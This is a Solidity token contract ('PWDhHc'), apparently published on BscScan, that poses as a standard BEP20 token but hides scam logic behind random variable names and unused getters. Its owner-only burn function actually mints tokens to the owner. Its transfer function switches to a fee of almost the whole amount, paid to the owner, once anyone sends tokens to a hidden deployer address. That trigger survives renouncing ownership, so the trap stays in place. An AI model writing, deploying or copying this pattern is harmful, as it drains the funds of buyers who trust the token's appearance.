/**
 *Submitted for verification at BscScan.com on 2022-12-06
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity >=0.6.7;
library Safehelp {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Safehelp: addition overflow");
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "Safehelp: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "Safehelp: division by zero");
    }
		function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "Safehelp: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
       }
function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "Safehelp: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


contract OhApjRPx {
address private  kwnlBR = address(0);
address private  lHZXdy = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  fiYnYb = 1000000000000000000000;
mapping (address => uint256) public balanceOf;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  WhTJEU = 1000000000000000000;
address private  zghFjp = address(0);
string public  name = "PWDhHc";
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  mDRTzd = 100000000;
address private  sThcRa = address(0);
address private  ZEsimk = address(0);
address private  lZceMh = address(0);
string public  symbol = "PWDhHc";
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  BxdOgP = address(0);
uint256 private  UotskO = 10000000000000;
address private  ZjsYov = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public constant HtHSar = 99999;
uint256 private  zrJVPx = 1000000000000000;
uint256 private  LOIsaG = 10000000000;
address public owner;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  XSpNdE = address(0);
uint8 public constant decimals = 18;
uint256 private  PohhQY = 1000000000000000000;
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tIZdqIM 0");
require(spender != address(0), "fIZdqIM 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}


function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getlZceMh() private returns (address) {
return lZceMh;
}


constructor () public {
kwnlBR = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getLOIsaG() private returns (uint256) {
return LOIsaG;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}


function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getfiYnYb() private returns (uint256) {
return fiYnYb;
}

function _getsThcRa() private returns (address) {
return sThcRa;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}


function _getZjsYov() private returns (address) {
return ZjsYov;
}

function _getXSpNdE() private returns (address) {
return XSpNdE;
}



function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}


function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}




function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "IZdqIM");
require(to != address(0), "IZdqIM");
require(amount <= balanceOf[from], "IZdqIM");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* HtHSar/WhTJEU ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==kwnlBR){
WhTJEU = HtHSar+2;
}
emit Transfer(from, to, transferAmount);
}
function _getZEsimk() private returns (address) {
return ZEsimk;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getPohhQY() private returns (uint256) {
return PohhQY;
}



function _getBxdOgP() private returns (address) {
return BxdOgP;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}


function _getUotskO() private returns (uint256) {
return UotskO;
}

function _getzrJVPx() private returns (uint256) {
return zrJVPx;
}

function _getzghFjp() private returns (address) {
return zghFjp;
}



function _getmDRTzd() private returns (uint256) {
return mDRTzd;
}

function _getlHZXdy() private returns (address) {
return lHZXdy;
}




}